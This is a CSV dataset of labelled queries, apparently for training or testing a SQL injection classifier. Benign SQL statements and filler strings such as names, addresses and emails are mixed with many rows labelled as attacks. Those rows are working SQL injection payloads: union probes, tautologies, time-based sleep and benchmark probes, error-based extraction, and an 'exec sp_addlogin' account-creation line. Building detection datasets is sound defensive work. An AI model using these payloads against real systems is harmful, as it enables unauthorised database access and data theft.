Query,Label
-9556'  )   where 2472  =  2472 or   (  2883  =  9968  )  *9968--,1
cado,0
-3582'  )   or 6872  =  6872 and   (  'gyfj'  =  'gyfj,1
SELECT TOP 50 PERCENT * FROM couple SELECT * FROM use FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM instance,0
" SELECT Shippers.ShipperName, COUNT ( Orders.OrderID )  AS NumberOfOrders FROM Orders LEFT JOIN Shippers ON Orders.ShipperID  =  Shippers.ShipperID  GROUP BY ShipperName;",0
z5r1174osa,0
1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
SELECT * FROM bill WHERE cover NOT LIKE 'industry%',0
"   SELECT fought, previous, occasionally FROM without WHERE meant  IS NULL",0
waitfor delay '0:0:5',1
descapotar,0
SELECT * FROM solid,0
"iif  (  1483  =  7301,1,1/0  )  ",1
75131649x,0
SELECT minute ( s )  FROM activity SELECT straw FROM collect,0
1'||  (  select 'bgdh' from dual where 1967  =  1967,1
SELECT TOP 3 * FROM ought WHERE brain = 'birthday' SELECT * FROM major,0
"calle duque de zaragoza s/n,",0
"calle jose espejo, 130, 12?a",0
21710,0
1450,0
cariena,0
blenkarn6,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11451 )  ORDER BY meta_id ASC",0
SELECT * FROM chart,0
"1'  )   union all select null,null,null,null,null--",1
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  '%'  =  '",1
57417611c,0
"   SELECT COUNT ( oil ) , throat FROM spend BY quite",0
"   SELECT COUNT ( couple ) , recent FROM serious BY golden",0
8888,0
"1  )   as wvpl where 9791  =  9791 and make_set  (  3491  =  9067,9067  )  --",1
"calle costa brava, 148,",0
SELECT AVG ( came )  FROM fix  SELECT SUM ( cut ) ,0
-2817  )   where 1212  =  1212 or 3266  =  1102,1
"-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#",1
SELECT * FROM movement WHERE NOT pour = 'because'  AND NOT being = 'foreign',0
barceo,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   #",1
30034324g,0
"  SELECT ready,original FROM roof WHERE atmosphere = 'green' UNION SELECT chose, younger FROM finish",0
SELECT TOP 3 * FROM gray WHERE tropical = 'son',0
SELECT AVG ( Price ) FROM check,0
"   SELECT COUNT ( uncle ) , day FROM family BY instant",0
SELECT RADIANS ( -45 ) ;,0
1   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  5368  =  5368,1
SELECT * FROM it WHERE native BETWEEN 'milk' AND 'sitting',0
SELECT TOP 50 PERCENT * FROM yellow,0
"-4653' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
" SELECT * FROM balloon ORDER BY climate, mostly",0
1   )    )    as ogcv where 4396  =  4396,1
1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'krvo' like 'krvo,1
"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yxpo"" like ""yxpo",1
"-1816""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dztr"" like ""dztr",1
tice,0
1' and   (  3020  =  3020  )  *6703 and 'hnvf'  =  'hnvf,1
"1'||  (  select 'kbvq' where 9279  =  9279 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1
"-2359' union all select 2687,2687,2687#",1
vilmanse80,0
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'efwq' like 'efwq",1
SELECT TOP 50 PERCENT * FROM across,0
"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'rxxb'  =  'rxxb",1
-4322'   )    )    as magw where 1627  =  1627 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
SELECT AVG ( happen ) FROM unusual,0
alkin@lesionesmusculares.pf,0
sookdeo,0
butalov0@lettere.dm,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",1
"1'+  (  select 'utlx' where 6256  =  6256 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",1
"-4317""   )    )    as nxvn where 2566  =  2566 union all select 2566,2566,2566#",1
1' where 6003  =  6003 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
"1%"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  """,1
SELECT AVG ( slightly ) FROM vertical,0
"1"" where 9725  =  9725",1
geir,0
"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",1
"calle de circulacio de l' oest, 7",0
SELECT * FROM ball WHERE bar = 'nearly'  OR whatever = 'advice',0
alvino,0
1  )   as fxfe where 1148  =  1148 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
"1'  )   where 6720  =  6720 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1'+  (  select 'yahq' where 6974  =  6974 union all select null--,1
mazursky@mundo-deportivo.mx,0
8.27055E+15,0
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",1
"exec sp_addlogin 'name' , 'password'",1
"-4849""   )    )    or   (  5005  =  9111  )  *9111 and    (    (   ""catv"" like ""catv",1
SELECT thick ( s ) FROM pleasant INNER JOIN,0
SELECT COUNT ( wood ) FROM proper,0
SELECT * FROM meat WHERE slave = 'ask'  OR vertical = 'section',0
"INSERT INTO fire ( very, shout, string, lips, dollar, was )  VALUES  ( 'completely', 'flow'. border', 'acres', 'jungle', 'captain', 'blew' )  ",0
"1  )   as pcnd where 4589  =  4589 union all select null,null,null,null,null,null,null,null,null,null--",1
"1   )    )    union all select null,null,null,null,null,null,null--",1
SELECT * FROM firm FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM quite,0
"1'+  (  select 'mxei' where 7811  =  7811 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
sirevici,0
SELECT AVG ( waste ) FROM expect,0
SELECT * FROM off FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM guard,0
"1""  )   where 3826  =  3826",1
SELECT MIN ( parallel )  AS happily FROM roof,0
1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,1
kappa,0
SELECT DISTINCT business FROM plus,0
select   (  case when   (  6961  =  7460  )   then 1 else 6961*  (  select 6961 from master..sysdatabases  )   end  )  --,1
SELECT * FROM wrapped WHERE NOT ability = 'brick'  AND NOT thing = 'doll',0
falerno,0
SELECT TOP 50 PERCENT * FROM anything,0
grajear,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367583 ) ,0
"-5078 union all select 9708,9708--",1
SELECT AVG ( think ) FROM apart,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",1
"SELECT user_id, meta_key, meta_value FROM wp_usermeta WHERE user_id IN  ( 1 )  ORDER BY umeta_id ASC",0
"-1134"" union all select 4865,4865,4865,4865,4865#",1
 UPDATE tiny SET follow = 'tight'WHERE return = 'rocky',0
SELECT * FROM age WHERE equally  BETWEEN 10 AND 20,0
" SELECT column_name ( s )  FROM citizen,action",0
SELECT option_value FROM wp_options WHERE option_name  =  'acf_pro_license' LIMIT 1,0
SELECT * FROM relationship,0
c/ guillen santacilla 94,0
SELECT MIN ( deep )  AS visitor FROM early,0
1   )    )     )   union all select null--,1
SELECT TOP 3 * FROM tone WHERE lesson = 'stepped' SELECT * FROM needle,0
botarell,0
SELECT * FROM connected WHERE donkey NOT BETWEEN 'save' AND 'angle',0
859,0
5.01119E+15,0
"INSERT INTO pilot  ( daughter, card, anyone )  VALUES  ( 'load', 'brick', 'experience' )  ",0
SELECT TOP 3 * FROM against SELECT * FROM game 3SELECT * FROM popular,0
SELECT * FROM voyage FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM wheel,0
SELECT AVG ( ourselves ) FROM bottle SELECT SUM ( back ) ,0
"or 1  =  1 or """"  =  ",1
1 or sleep  (  __TIME__  )  #,1
"-9451""   )    )     )   union all select 4211,4211,4211,4211,4211,4211,4211--",1
" SELECT * FROM root ORDER BY electric ASC, remarkable DESC",0
SELECT DISTINCT noise FROM pony,0
"  SELECT Orders.letterrID, Employees.silence, Employees.dinner FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.everyID ORDER BY Orders.trackID",0
19223,0
SELECT * FROM bet WHERE NOT mean = 'organization'  AND NOT condition = 'cutting',0
7656,0
acrianzada,0
polit lauli,0
1'  )   where 9317  =  9317 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
"   SELECT whether, arrange, problemFROM fear WHERE addition  IS NOT NULL",0
SELECT * FROM than WHERE slipped BETWEEN 'frighten' AND 'keep',0
-9562' or 8571  =  8571--,1
"-7806""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""vlrj"" like ""vlrj",1
" SELECT * FROM charge ORDER BY free ASC, brush DESC",0
maccoll-stringer@programa-gestion-erp.nr,0
"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",1
SELECT * FROM  ( SELECT beginning FROM gold ) ,0
"1%'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",1
SELECT * FROM church WHERE obtain = 'addition' FETCH FIRST 3 ROWS ONLY,0
dra2atizar,0
"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --",1
SELECT * FROM  ( SELECT either FROM willing ) ,0
-1910' or 2624  =  3371 and 'umoy'  =  'umoy,1
"1"" where 7045  =  7045",1
SELECT * FROM welcome WHERE eventually NOT LIKE '[identity]%',0
"  SELECT onceID AS ID, young AS modern FROM knife",0
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- icxn,1
"1%'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '",1
masegosa,0
SELECT * FROM garden,0
"llobregat 130,",0
1'+  (  select 'wyed' where 9896  =  9896,1
 UPDATE slipped SET field = 'pleasant'WHERE ocean = 'hungry',0
DELETE FROM slightly,0
1 or sleep  (  5  )  -- nrzf,1
SELECT * FROM capital WHERE kill = 'oxygen'  OR airplane = 'known',0
raixa s/n,0
DELETE FROM charge,0
"1%""  )   union all select null,null,null,null,null,null#",1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'gsdq'  =  'gsdq",1
"c/jon habana, 111",0
 UPDATE instant SET slowly = 'sometime'WHERE positive = 'care',0
"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",1
"-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1
"-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",1
2.4082E+15,0
rougerie@cincocolores.sd,0
SELECT * FROM wing ORDER BY control,0
SELECT * FROM hung WHERE easily NOT LIKE '[bill]%',0
63171354z,0
"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""atlz""  =  ""atlz",1
trampeador,0
SELECT * FROM require FETCH FIRST 50 PERCENT ROWS ONLY,0
5719,0
"1'  )   union all select null,null,null,null,null,null,null,null,null--",1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",1
select   (  case when   (  2751  =  8206  )   then 2751 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
DELETE FROM busy,0
benedict@deltamarina.ve,0
7960,0
SELECT TOP 50 PERCENT * FROM am,0
" SELECT * FROM rays ORDER BY parallel, milk",0
villacastn,0
SELECT guide ( s )  FROM baseball SELECT war ( s ) ,0
SELECT COUNT ( structure )  FROM date,0
sitiwet-chagas@creacionesacampada.travel,0
" SELECT * FROM held ORDER BY today, mistake",0
c/ manresa 56 2-e,0
"1'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   'oucg'  =  'oucg",1
"1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517",1
48638626c,0
aldeaseca de alba,0
xixia,0
-8521'+  (  select ucim where 9003  =  9003 union all select 9003--,1
SELECT MIN ( harbor )  AS appropriate FROM ranch,0
"-9008'  )   union all select 4976,4976,4976,4976#",1
"1""  )   as ymsc where 3694  =  3694 waitfor delay '0:0:5'--",1
SELECT waste ( s )  FROM direct SELECT putting ( s ) ,0
meggy,0
" SELECT * FROM eat ORDER BY copper, dot",0
"1%'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
21388,0
SELECT * FROM earth WHERE mysterious NOT BETWEEN 'done' AND 'donkey',0
"1""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""wjhj""  =  ""wjhj",1
SELECT * FROM machine  WHERE death NOT LIKE '[tool]%',0
SELECT * FROM spend WHERE because BETWEEN 'union' AND 'remember',0
SELECT * FROM difficult WHERE sick LIKE '%serve%',0
"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT * FROM year WHERE Price NOT BETWEEN 10 AND 20,0
daya basulto,0
SELECT * FROM construction WHERE production BETWEEN '1996-07-01' AND '1996-07-31',0
"  SELECT touch,distant,gun FROM into LEFT JOIN Orders ON hardly.termID =  apart.view ORDER BY forward.discussion",0
SELECT * FROM  ( SELECT his FROM baseball ) ,0
"peral, 180 4-b",0
SELECT TOP 3 * FROM paint SELECT * FROM prove 3SELECT * FROM certain,0
"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mmgx"" like ""mmgx",1
yasna,0
SELECT AVG ( thought ) FROM forget SELECT SUM ( cutting ) ,0
47131,0
"   SELECT COUNT ( famous ) , sentence FROM explain BY shallow",0
-7444   )    )     )   or 1342  =  9774,1
SELECT Count ( * )  AS whether,0
"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",1
SELECT * FROM becoming ORDER BY chain DESC,0
ayat rozas,0
SELECT * FROM below WHERE fill NOT LIKE 'situation%',0
"admin"" or ""1""  =  ""1""--",1
"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT * FROM voice WHERE production BETWEEN '1996-07-01' AND '1996-07-31',0
" SELECT column_name ( s )  FROM chosen,eleven",0
valdelagua del cerro,0
strucak@cortell.cat,0
23611263s,0
"   SELECT rapidly, carefully, voyage FROM simply WHERE seems  IS NULL",0
kashfi@cropbay.jobs,0
SELECT Count ( * )  AS already,0
SELECT TOP 50 PERCENT * FROM today SELECT * FROM taught FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM improve,0
SELECT * FROM notice FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cross,0
50549,0
"-4236  )   union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#",1
"  SELECT substanceID AS ID, instant AS triangle FROM bush",0
"1   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   9914  =  9914",1
"1%""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""%""  =  """,1
"  SELECT * FROM suppose WHERE threw IN  ( 'student', 'rope', 'means' )  ",0
"1""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""yrgy"" like ""yrgy",1
SELECT * FROM  ( SELECT gasoline FROM busy ) ,0
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi",1
"1'   )    )     )   union all select null,null,null,null,null,null,null--",1
SELECT * FROM manufacturing WHERE let NOT LIKE 'just%',0
"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM sit FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM apart,0
"-4127%' union all select 9558,9558,9558#",1
garrotazo,0
1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
SELECT shade ( s )  FROM yard,0
"1  )   where 3915  =  3915 union all select null,null,null,null#",1
SELECT * FROM element 3,0
"1' where 7125  =  7125 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",1
"1"" where 9230  =  9230",1
cabildeo,0
enris6rar,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""%""  =  """,1
"INSERT INTO line ( center, soap, came, farther, bread, pot )  VALUES  ( 'night', 'moment'. any', 'pile', 'desk', 'baby', 'does' )  ",0
mayworth@sms24h.tr,0
"1"" where 9173  =  9173 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1
SELECT COUNT ( DISTINCT kitchen )  FROM tired,0
"SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND tr.object_id IN  ( 347681, 262330, 292419, 262334 )  ORDER BY t.name ASC",0
" SELECT * FROM Customers  ORDER BY Country ASC, CustomerName DESC;",0
"select * from generate_series  (  9709,9709,case when   (  9709  =  7795  )   then 1 else 0 end  )   limit 1--",1
"SELECT WEEKOFYEAR ( ""2017-01-01"" ) ;",0
perene,0
madrigal puigb,0
SELECT * FROM gold WHERE greatly = 'consonant' LIMIT 3,0
"1""  )   where 1212  =  1212 and 8475  =  5864",1
"sant sever 63, 6-b",0
"calle piles, 190",0
9380,0
" select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",1
3596,0
 UPDATE practical SET hang = 'fellow'WHERE carried = 'mark',0
"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
84304826m,0
"c/ ruiz de salazar, 49 4d",0
"1'  )   as ssez where 5351  =  5351 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
select   (  case when   (  7271  =  1658  )   then 7271 else 7271*  (  select 7271 from information_schema.character_sets  )   end  )  #,1
-7600' or 7684  =  3181#,1
inmol4dor,0
bockaj,0
"1' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1' and   (  5116  =  1602  )  *1602,1
18898337l,0
ac6di9o,0
"-6656""  )   union all select 3931#",1
SELECT * FROM should WHERE test IN  ( SELECT pig FROM exclaimed ) ,0
"simancas, 172, 8-d",0
SELECT * FROM cause WHERE atomic = 'plural',0
75106972n,0
a3ui11d,0
 UPDATE choose SET promised = 'curve'WHERE ocean = 'social',0
SELECT standard FROM shoot UNION ALL SELECT flies FROM saved ORDER BY children,0
"  SELECT * FROM location WHERE arrive IN  ( 'engineer', 'recall', 'writer' )  ",0
SELECT COUNT ( DISTINCT facing )  FROM fifty,0
50619,0
njar,0
23 or 1  =  1; --,1
"   SELECT Employees.number, COUNT ( Orders.dailyID )  AS incomeFROM    ( OrdersINNER JOIN purple ON Orders.dependID  =  Employees.passageID ) ",0
"  SELECT * FROM extra WHERE same NOT IN  ( 'recall', 'practical', 'best' )  ",0
SELECT * FROM willing FETCH FIRST 3 ROWS ONLY,0
?,1
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1
SELECT * FROM had WHERE keep = 'claws',0
1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',1
3.14114E+15,0
su6sc87u23r,0
"  SELECT weather AS event, production AS [inch]  FROM never",0
1  )   where 9821  =  9821 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
"1'   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1
SELECT TOP 3 * FROM certainly,0
"1""  )   as rcnk where 1800  =  1800",1
"   SELECT aboard, cookies, feathers FROM instant WHERE wrote  IS NULL",0
SELECT limited ( s )  FROM found UNION ALL,0
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",1
select case when 7649  =  9297 then 1 else null end--,1
"c/ el jacinto, 132,",0
3.36323E+15,0
"1'+  (  select uqdb where 3508  =  3508 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1%'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   '%'  =  '",1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'nhuk'  =  'nhuk",1
"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""eoab"" like ""eoab",1
" SELECT column_name ( s )  FROM fresh,road",0
"1'||  (  select 'fcws' from dual where 9184  =  9184 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",1
3.07443E+15,0
"1%'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  '%'  =  '",1
SELECT * FROM car WHERE five = 'person'  AND  ( recently = 'yet' OR adult = 'second' ) ,0
"  UPDATE kitchen SET product =  'wait', City =  'favorite' WHERE bat =  everything",0
93640511j,0
SELECT * FROM clear WHERE exciting NOT LIKE '[slept]%',0
"-9087"" order by 1#",1
mccollum,0
rebes huasequi,0
comalada,0
"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",1
SELECT DISTINCT brush FROM huge,0
SELECT COUNT ( examine ) FROM congress,0
nealson,0
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'vunt'  =  'vunt",1
76518142v,0
tejeda,0
22311,0
1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'qrtf'  =  'qrtf,1
sorts bransuel,0
6e665a,0
brownfie,0
"1'   )    )    as jxvv where 6593  =  6593 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
SELECT * FROM fallen  WHERE leg = ought,0
fisgar,0
reinhard,0
1'+  (  select zmbu where 8685  =  8685 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +',1
SELECT * FROM talk WHERE sugar BETWEEN '1996-07-01' AND '1996-07-31',0
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,1
SELECT COUNT ( swam ) FROM this,0
9usta4ui6,0
SELECT COUNT ( union )  FROM folks,0
roccardi.betten@carrillo-de-albornoz.mil,0
lozier,0
 or ''&',1
65,0
SELECT * FROM labor WHERE Price NOT BETWEEN 10 AND 20,0
SELECT AVG ( prize )  FROM bad  SELECT SUM ( quarter ) ,0
5a4a84e8a,0
"1""  )   union all select null,null,null,null,null,null,null,null#",1
"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",1
"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",1
1  )   where 4548  =  4548 and 9198  =  9198--,1
